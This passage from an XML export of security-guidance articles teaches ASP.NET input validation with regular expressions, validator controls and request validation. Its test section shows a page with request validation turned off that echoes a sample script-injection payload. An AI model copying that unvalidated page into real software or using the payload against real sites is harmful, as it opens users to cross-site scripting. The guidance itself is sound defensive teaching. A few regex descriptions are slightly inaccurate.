  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="140741137" Content_Hash="900825088">
    <Metadata>
      <Id>6513cc58-bf67-4458-a4fa-cee65144db25</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Use Regular Expressions to Constrain Input in ASP.NET</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Summary</h1><p>This How to shows how you can use regular expressions within ASP.NET applications to constrain untrusted input. Regular expressions are a good way to validate text fields such as names, addresses, phone numbers, and other user information. You can use them to constrain input, apply formatting rules, and check lengths. To validate input captured with server controls, you can use the <strong>RegularExpressionValidator</strong> control. To validate other forms of input, such as query strings, cookies, and HTML control input, you can use the <strong>System.Text.RegularExpressions.Regex</strong> class.</p><p>This How to shows how you can use regular expressions within ASP.NET applications to constrain untrusted input.</p><h1>Contents</h1><ul><li><div>Objectives</div></li><li><div>Overview</div></li><li><div>Using a RegularExpressionValidator Control</div></li><li><div>Using the Regex Class</div></li><li><div>Common Regular Expressions</div></li><li><div>Additional Resources</div></li></ul><h1>Objectives</h1><ul><li>Use regular expressions to constrain input, apply format rules, and check lengths. </li><li>Use the ASP.NET <strong>RegularExpressionValidator</strong> control to constrain and validate input. </li><li>Use the <strong>Regex</strong> class to constrain and validate input. </li><li>Learn common regular expressions that can be used to constrain input. </li></ul><h1>Overview</h1><p>If you make unfounded assumptions about the type, length, format, or range of input, your application is unlikely to be robust. Input validation can become a security issue if an attacker discovers that you have made unfounded assumptions. The attacker can then supply carefully crafted input that compromises your application by attempting SQL injection, cross-site scripting, and other injection attacks. To avoid such vulnerability, you should validate text fields (such as names, addresses, tax identification numbers, and so on) and use regular expressions to do the following: </p><ul><li>Constrain the acceptable range of input characters. </li><li>Apply formatting rules. For example, pattern-based fields, such as tax identification numbers, ZIP Codes, or postal codes, require specific patterns of input characters. </li><li>Check lengths. </li></ul><p>Regular expression support is available to ASP.NET applications through the <strong>RegularExpressionValidator</strong> control and the <strong>Regex</strong> class in the <strong>System.Text.RegularExpressions</strong> namespace.</p><h1>Using a RegularExpressionValidator Control</h1><p>If you capture input by using server controls, you can use the <strong>RegularExpressionValidator</strong> control to validate that input. You can use regular expressions to restrict the range of valid characters, to strip unwanted characters, and to perform length and format checks. You can constrain the input format by defining patterns that the input must match.</p><h2>To validate a server control's input using a RegularExpressionValidator </h2><ol><li>Add a <strong>RegularExpressionValidator</strong> control to your page. </li><li>Set the <strong>ControlToValidate</strong> property to indicate which control to validate. </li><li>Set the <strong>ValidationExpression</strong> property to an appropriate regular expression. </li><li>Set the <strong>ErrorMessage</strong> property to define the message to display if the validation fails. </li></ol><p>The following example shows a <strong>RegularExpressionValidator</strong> control used to validate a name field.</p><div><pre>&lt;%@ language="C#" %&gt;<br>&lt;form id="form1" runat="server"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID="txtName" runat="server"/&gt;<br>&nbsp;&nbsp;&nbsp; &lt;asp:Button ID="btnSubmit" runat="server" Text="Submit" /&gt;<br>&nbsp;&nbsp;&nbsp; &lt;asp:RegularExpressionValidator ID="regexpName" runat="server"&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ErrorMessage="This expression does not validate." <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ControlToValidate="txtName"&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ValidationExpression="^[a-zA-Z'.\s]{1,40}$" /&gt;<br>&lt;/form&gt;  </pre></div><p>The regular expression used in the preceding code example constrains an input name field to alphabetic characters (lowercase and uppercase), space characters, the single quotation mark (or apostrophe) for names such as O'Dell, and the period or dot character. In addition, the field length is constrained to 40 characters.</p><h2>Using ^ and $</h2><p>Enclosing the expression in the caret (<strong>^</strong>) and dollar sign (<strong>$)</strong>markers ensures that the expression consists of the desired content and nothing else. A <strong>^</strong> matches the position at the beginning of the input string and a <strong>$</strong> matches the position at the end of the input string. If you omit these markers, an attacker could affix malicious input to the beginning or end of valid content and bypass your filter.</p><h1>Using the Regex Class</h1><p>If you are not using server controls (which means you cannot use the validation controls) or if you need to validate input from sources other than form fields, such as query string parameters or cookies, you can use the <strong>Regex</strong> class within the <strong>System.Text.RegularExpressions</strong> namespace.</p><h2>To use the Regex class </h2><ol><li>Add a <strong>using</strong> statement to reference the <strong>System.Text.RegularExpressions</strong> namespace. </li><li>Call the <strong>IsMatch</strong> method of the <strong>Regex</strong> class, as shown in the following example. <div><pre>// Instance method:<br>Regex reg = new Regex(@"^[a-zA-Z'.]{1,40}$");<br>Response.Write(reg.IsMatch(txtName.Text));<br>// Static method:<br>if (!Regex.IsMatch(txtName.Text, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @"^[a-zA-Z'.]{1,40}$"))<br>{<br>&nbsp; // Name does not match schema<br>}  </pre></div></li></ol><p>For performance reasons, you should use the static <strong>IsMatch</strong> method where possible to avoid unnecessary object creation.</p><p>The following example shows how to use a regular expression to validate a name input through a regular client-side HTML control.</p><div><pre>&lt;%@ Page Language="C#" %&gt;</pre><pre>&lt;html&nbsp; &gt;<br>&nbsp; &lt;body&gt;<br>&nbsp;&nbsp;&nbsp; &lt;form id="form1" method="post" action="HtmlControls.aspx"&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Name:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input name="txtName" type="text" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input name="submitBtn" type="Submit" value="Submit"/&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/form&gt;<br>&nbsp; &lt;/body&gt;<br>&lt;/html&gt;</pre></div><pre>&lt;script runat="server"&gt;</pre><pre>&nbsp; void Page_Load(object sender, EventArgs e)<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp; if (Request.RequestType == "POST")<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string name = Request.Form["txtName"];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (name.Length &gt; 0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (System.Text.RegularExpressions.Regex.IsMatch(name, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "^[a-zA-Z'.]{1,40}$"))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response.Write("Valid name");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response.Write("Invalid name");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp; }</pre><pre>&lt;/script&gt;  </pre><h2>Use Regular Expression Comments</h2><p>Regular expressions are much easier to understand if you use the following syntax and comment each component of the expression by using a number sign (<strong>#</strong>). To enable comments, you must also specify <strong>RegexOptions.IgnorePatternWhitespace</strong>, which means that non-escaped white space is ignored.</p><div><pre>Regex regex = new Regex(@"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ^&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # anchor at the start<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (?=.*\d)&nbsp;&nbsp;&nbsp;&nbsp; # must contain at least one numeric character<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (?=.*[a-z])&nbsp; # must contain one lowercase character<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (?=.*[A-Z])&nbsp; # must contain one uppercase character<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .{8,10}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # From 8 to 10 characters in length<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \s&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # allows a space <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # anchor at the end", <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RegexOptions.IgnorePatternWhitespace);  </pre></div><h1>Common Regular Expressions</h1><p>Some common regular expressions are shown in Table 1.</p><p><strong>Table 1. Common Regular Expressions</strong></p><div><table><tbody><tr><th>Field </th><th>Expression</th><th>Format Samples</th><th>Description</th></tr><tr><td>Name</td><td>^[a-zA-Z''-'\s]{1,40}$</td><td>John Doe<br>O'Dell</td><td>Validates a name. Allows up to 40 uppercase and lowercase characters and a few special characters that are common to some names. You can modify this list.</td></tr><tr><td>Social Security Number</td><td>^\d{3}-\d{2}-\d{4}$</td><td>111-11-1111</td><td>Validates the format, type, and length of the supplied input field. The input must consist of 3 numeric characters followed by a dash, then 2 numeric characters followed by a dash, and then 4 numeric characters.</td></tr><tr><td>Phone Number</td><td>^[01]?[- .]?(\([2-9]\d{2}\)|[2-9]\d{2})[- .]?\d{3}[- .]?\d{4}$</td><td>(425) 555-0123<br>425-555-0123<br>425 555 0123<br>1-425-555-0123</td><td>Validates a U.S. phone number. It must consist of 3 numeric characters, optionally enclosed in parentheses, followed by a set of 3 numeric characters and then a set of 4 numeric characters. </td></tr><tr><td>E-mail </td><td>^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$</td><td>someone@example.com</td><td>Validates an e-mail address.</td></tr><tr><td>URL</td><td>^(ht|f)tp(s?)\:\/\/[0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*(:(0-9)*)*(\/?)([a-zA-Z0-9\-\.\?\,\'\/\\\+&amp;amp;%\$#_]*)?$</td><td>http://www.microsoft.com</td><td>Validates a URL </td></tr><tr><td>ZIP Code</td><td>^(\d{5}-\d{4}|\d{5}|\d{9})$|^([a-zA-Z]\d[a-zA-Z] \d[a-zA-Z]\d)$</td><td>12345</td><td>Validates a U.S. ZIP Code. The code must consist of 5 or 9 numeric characters.</td></tr><tr><td>Password</td><td>(?!^[0-9]*$)(?!^[a-zA-Z]*$)^([a-zA-Z0-9]{8,10})$</td><td>&nbsp;</td><td>Validates a strong password. It must be between 8 and 10 characters, contain at least one digit and one alphabetic character, and must not contain special characters.</td></tr><tr><td>Non- negative integer</td><td>^\d+$</td><td>0<br>986</td><td>Validates that the field contains an integer greater than zero.</td></tr><tr><td>Currency (non- negative)</td><td>^\d+(\.\d\d)?$</td><td>1.00</td><td>Validates a positive currency amount. If there is a decimal point, it requires 2 numeric characters after the decimal point. For example, 3.00 is valid but 3.1 is not.</td></tr><tr><td>Currency (positive or negative)</td><td>^(-)?\d+(\.\d\d)?$</td><td>1.20</td><td>Validates for a positive or negative currency amount. If there is a decimal point, it requires 2 numeric characters after the decimal point.</td></tr></tbody></table></div><h1>Additional Resources</h1><ul><li>For more information, see the regular expression tutorial at <a href="http://www.regular-expressions.info/tutorial.html">http://www.regular-expressions.info/tutorial.html</a>.</li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1935854100" Content_Hash="312903613">
    <Metadata>
      <Id>6bfe7761-6f2a-43c2-a104-7ad3063affb3</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Protect From Injection Attacks in ASP.NET</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Summary</h1><p>This How to shows how you can validate input to protect your application from injection attacks. Performing input validation is essential because almost all application-level attacks contain malicious input. </p><p>You should validate all input, including form fields, query string parameters, and cookies to protect your application against malicious command injection. Assume all input to your Web application is malicious, and make sure that you use server validation for all sources of input. Use client-side validation to reduce round trips to the server and to improve the user experience, but do not rely on it because it is easily bypassed. </p><p>To validate input, define acceptable input for each application input field. A proven practice is to constrain input for length, range, format, and type. Use the list of acceptable characters to define valid input, instead of the list of unacceptable characters. Using the list of unacceptable characters is impractical because it is very difficult to anticipate all possible variations of bad input.</p><p>When you need to accept a range of HTML characters, make sure that you HTML-encode the data to make it safe prior to displaying it as output.</p><h1>Contents</h1><ul><li><div>Objectives</div></li><li><div>Overview</div></li><li><div>Summary of Steps</div></li><li><div>Step 1. Use ASP.NET Request Validation</div></li><li><div>Step 2. Constrain Input</div></li><li><div>Step 3. Encode Unsafe Output</div></li><li><div>Step 4. Use Command Parameters for SQL Queries</div></li><li><div>Step 5. Verify that ASP.NET Errors Are Not Returned to the Client</div></li><li><div>Additional Resources</div></li></ul><h1>Objectives</h1><ul><li>Constrain input for length, range, format, and type. </li><li>Apply ASP.NET request validation during development to identify injection attacks. </li><li>Constrain input by using ASP.NET validator controls. </li><li>Encode unsafe output. </li><li>Help prevent SQL injection by using command parameters. </li><li>Prevent detailed error information from returning to the client. </li></ul><h1>Overview</h1><p>You need to validate all untrusted input to your application. You should assume that any input from users is malicious. User input to your Web application includes form fields, query strings, client-side cookies, and browser environment values such as user agent strings and IP addresses. </p><p>Weak input validation is a common vulnerability that could allow your application to be exploited by a number of injection attacks. The following are common types of attacks that exploit weak or missing input validation: </p><ul><li><strong>SQL injection. </strong>If you generate dynamic SQL queries based on user input, an attacker could inject malicious SQL commands that can be executed by the database. </li><li><strong>Cross-site scripting.</strong> Cross-site scripting (XSS) attacks exploit vulnerabilities in Web page validation by injecting client-side script code. This code is subsequently sent to an unsuspecting user's computer and executed on the browser. Because the browser downloads the script code from a trusted site, the browser has no way of determining whether the code is legitimate. </li><li><strong>Unauthorized file access.</strong> If your code accepts input from a caller, a malicious user could potentially manipulate your code's file operations, such as accessing a file they should not access or exploiting your code by injecting bad data. </li></ul><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;Injection attacks work over HTTP and HTTPS Secure Socket Layer (SSL) connections. Encryption provides no defense.</blockquote><p>The general approach for input validation is summarized here. You should apply this approach to any input that comes from the network, such as text boxes and other forms field input, query string parameters, cookies, server variables, and Web method parameters. Note that the strategy is to first allow only good input and then deny bad input. This is because you can easily define good input for your application, but you cannot realistically anticipate the format for all malicious input. </p><p>Check for valid input as follows: </p><ul><li><strong>Constrain: </strong>Check for known good data by validating the type, length, format, and range. To constrain input from server controls, use the ASP.NET validator controls. To constrain input from other sources, use regular expressions and custom validation. </li><li><strong>Reject:</strong> Check for any known bad data and reject bad input. </li><li><strong>Sanitize:</strong> Sometimes you also need to sanitize input and make potentially malicious input safe. For example, if your application supports free-format input fields, such as comment fields, you might want to permit certain safe HTML elements, such as &lt;<strong>b</strong>&gt; and &lt;<strong>i</strong>&gt;, and eliminate any other HTML elements. </li></ul><h1>Summary of Steps</h1><p>To protect your ASP.NET application from injection attacks, perform the following steps: </p><ul><li>Step 1. Use ASP.NET request validation. </li><li>Step 2. Constrain input. </li><li>Step 3. Encode unsafe output. </li><li>Step 4. Use command parameters for SQL queries. </li><li>Step 5. Verify that ASP.NET errors are not returned to the client. </li></ul><p>The next sections describe each of these.</p><h1>Step 1. Use ASP.NET Request Validation</h1><p>By default, ASP.NET request validation detects any HTML elements and reserved characters in data posted to the server. This helps prevent users from inserting script into your application. Request validation checks all input data against a hard-coded list of potentially dangerous values. If a match occurs, it throws an exception of type <strong>HttpRequestValidationException</strong>.</p><p>You can disable request validation in your Web.config application configuration file by adding a &lt;<strong>pages</strong>&gt; element with <strong>validateRequest="false"</strong> or on an individual page by setting <strong>ValidateRequest="false"</strong> on the <strong>@ Pages</strong> element. </p><p>If you need to disable request validation, you should disable it only on the affected page. An example of this is when you have a page with a free-format text field that accepts HTML-formatted input.</p><h2>Confirm that ASP.NET Request Validation Is Enabled in Machine.config</h2><p>Request validation is enabled by ASP.NET by default. You can see the following default setting in the Machine.config.comments file.</p><div><pre>&lt;pages validateRequest="true" ... /&gt;  </pre></div><p>Confirm that you have not disabled request validation by overriding the default settings in your server's Machine.config file or your application's Web.config file. </p><h2>Test ASP.NET Request Validation</h2><p>You can test the effects of request validation. To do this, create an ASP.NET page that disables request validation by setting <strong>ValidateRequest="false"</strong>, as follows.</p><div><pre>&lt;%@ Language="C#" ValidateRequest="false" %&gt;<br>&lt;html&gt;<br>&nbsp;&lt;script runat="server"&gt;<br>&nbsp; void btnSubmit_Click(Object sender, EventArgs e)<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp; // If ValidateRequest is false, then 'hello' is displayed<br>&nbsp;&nbsp;&nbsp; // If ValidateRequest is true, then ASP.NET returns an exception<br>&nbsp;&nbsp;&nbsp; Response.Write(txtString.Text);<br>&nbsp; }<br>&nbsp;&lt;/script&gt;<br>&nbsp;&lt;body&gt;<br>&nbsp; &lt;form id="form1" runat="server"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;asp:TextBox id="txtString" runat="server" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Text="&lt;script&gt;alert('hello');&lt;/script&gt;" /&gt;<br>&nbsp;&nbsp;&nbsp; &lt;asp:Button id="btnSubmit" runat="server" OnClick="btnSubmit_Click" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Text="Submit" /&gt;<br>&nbsp; &lt;/form&gt;<br>&nbsp;&lt;/body&gt;<br>&lt;/html&gt;  </pre></div><p>When you run the page, "Hello" is displayed in a message box because the script in <strong>txtString</strong> is passed through and rendered as client-side script in your browser.</p><p>If you set <strong>ValidateRequest="true" </strong>or remove the <strong>ValidateRequest</strong> page attribute, ASP.NET request validation rejects the script input and produces an error similar to the following.</p><div><pre>A potentially dangerous Request.Form value was detected from the client (txtString="&lt;script&gt;alert('hello...").  </pre></div><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;Do not rely on ASP.NET request validation. Treat it as an extra precautionary measure in addition to your own input validation.</blockquote><h1>Step 2. Constrain Input</h1><p>To constrain input, follow these guidelines: </p><ul><li><strong>Use server-side input validation.</strong> Do not rely on client-side validation because it is easily bypassed. Use client-side validation in addition to server-side validation to reduce round trips to the server and to improve the user experience. </li><li><strong>Validate length, range, format and type.</strong> Make sure that any input meets your guidelines for known good input. </li><li><strong>Use strong data typing. </strong>Assign numeric values to numeric data types such as <strong>Integer</strong> or <strong>Double</strong>. Assign string values to string data types. Assign dates to the <strong>DateTime</strong> data type. </li></ul><p>For Web form applications that obtain input through server controls, use the ASP.NET validator controls to constrain the input. For other sources of input data, such as query strings, cookies, and HTTP headers, constrain input by using the <strong>Regex</strong> class from the <strong>System.Text.RegularExpressions</strong> namespace.</p><h2>Explicitly Check Input from Form Fields</h2><p>To constrain form field input received through server controls, you can use the following ASP.NET validator controls: </p><ul><li><strong>RegularExpressionValidator.</strong> Use this control to constrain text input. </li><li><strong>RangeValidator.</strong> Use this control to check the ranges of numeric, currency, date, and string input. </li><li><strong>CustomValidator.</strong> Use this control for custom validation, such as ensuring that a date is in the future or in the past. </li></ul><p>To validate form field input received through HTML input controls, perform validation in server-side code and use the <strong>Regex</strong> class to help constrain text input. The following sections describe how to constrain a variety of common input types.</p><h3>Validating Text Fields </h3><ul><li>To validate text fields, such as names, addresses, and tax identification numbers, use regular expressions to do the following: </li><li>Constrain the acceptable range of input characters. </li><li>Apply formatting rules. For example, pattern-based fields, such as tax identification numbers, ZIP Codes, or postal codes, require specific patterns of input characters. </li><li>Check lengths. </li></ul><h3>Using a RegularExpressionValidator</h3><p>To use a <strong>RegularExpressionValidator</strong>, set the <strong>ControlToValidate</strong>, <strong>ValidationExpression</strong>, and <strong>ErrorMessage </strong>properties to appropriate values as shown in the following example.</p><div><pre>&lt;form id="WebForm" method="post" runat="server"&gt;<br>&nbsp; &lt;asp:TextBox id="txtName" runat="server"&gt;&lt;/asp:TextBox&gt;<br>&nbsp; &lt;asp:RegularExpressionValidator id="nameRegex" runat="server" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ControlToValidate="txtName" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ValidationExpression="^[a-zA-Z'.\s]{1,40}$" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ErrorMessage="Invalid name"&gt;<br>&nbsp; &lt;/asp:regularexpressionvalidator&gt;<br>&lt;/form&gt;  </pre></div><p>The regular expression used in the preceding code example limits an input name field to alphabetic characters (lowercase and uppercase), space characters, the single apostrophe for names such as O'Dell, and the period. In addition, the field length is constrained to 40 characters.</p><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;The <strong>RegularExpressionValidator</strong> control automatically adds a caret (^) and dollar sign ($) as delimiters to the beginning and end of expressions if you have not added them yourself. You should add them to all of your regular expressions as good practice. Enclosing the expression in the delimiters ensures that the expression consists of the desired content and nothing else.</blockquote><h3>Using the Regex Class</h3><p>If you are not using server controls (which means you cannot use the validator controls), or you need to validate input from sources other than form fields (such as from query string parameters or cookies), you can use a <strong>Regex</strong> class.</p><p><strong>To use the Regex class</strong> </p><ol><li>Add a <strong>using</strong> statement to reference the<strong> System.Text.RegularExpressions</strong> namespace. </li><li>Ensure that the regular expression is contained in the ^ and $ anchor characters (beginning of string, end of string). </li><li>Call the <strong>IsMatch</strong> method of the <strong>Regex</strong> class, as shown in the following code example. </li></ol><div><pre>// Instance method:<br>Regex reg = new Regex(@"^[a-zA-Z'.\s]{1,40}$");<br>Response.Write(reg.IsMatch(txtName.Text));</pre></div><pre>// Static method:<br>if (!Regex.IsMatch(txtName.Text,@"^[a-zA-Z'.\s]{1,40}$")) <br>{<br>&nbsp; // Name does not match expression<br>}</pre><p>If you cannot cache your regular expression for frequent use, you should use the static <strong>IsMatch</strong> method where possible for performance reasons, to avoid unnecessary object creation.</p><h3>Validating Numeric Fields</h3><p>In most cases, numeric fields should be checked for type and range. To validate the type and range of a numeric input field that uses a server control, you can use a <strong>RangeValidator</strong> control. The <strong>RangeValidator</strong> supports currency, date, integer, double, and string data types. </p><p>To use a <strong>RangeValidator</strong>, set the <strong>ControlToValidate</strong>, <strong>Type</strong>, <strong>MinimumValue</strong>, <strong>MaximumValue</strong>, and <strong>ErrorMessage</strong> properties to appropriate values as shown in the following example.</p><div><pre>&lt;asp:RangeValidator <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ID="RangeValidator1" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Runat="server" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ErrorMessage="Invalid range. Number must be between 0 and 255."<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ControlToValidate="rangeInput" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MaximumValue="255" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MinimumValue="0" Type="Integer" /&gt;  </pre></div><p>If you are not using a server control, you can validate a numeric range by converting the input value to an integer and then performing a range check. For example, to validate that an integer is valid, convert the input value to a variable of type <strong>System.Int32</strong> by using the <strong>Int32.TryParse</strong> method. This method returns <strong>false</strong> if the type conversion fails.</p><div><pre>Int32 i;<br>if (Int32.TryParse(txtInput.Text, out i) == false)<br>{<br>&nbsp; // Conversion failed<br>}  </pre></div><p>The following code shows how to perform a type and range check for an integer entered through an HTML text input control. </p><div><pre>&lt;%@ Page Language="C#" %&gt;</pre><pre>&lt;script runat="server"&gt;</pre><pre>&nbsp; void Page_Load(object sender, EventArgs e)<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp; if (Request.RequestType == "POST")<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int i;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (Int32.TryParse(Request.Form["integerTxt"], out i) == true)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // TryParse returns true if the conversion succeeds<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ((0 &lt;= i &amp;&amp; i &lt;= 255) == true)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response.Write("Input data is valid.");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response.Write("Input data is out of range");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response.Write("Input data is not an integer");<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp; }<br>&nbsp;&nbsp; <br>&lt;/script&gt;</pre></div><pre>&lt;html&gt;<br>&nbsp; &lt;body&gt;<br>&nbsp;&nbsp;&nbsp; &lt;form id="form1" action="NumericInput.aspx" 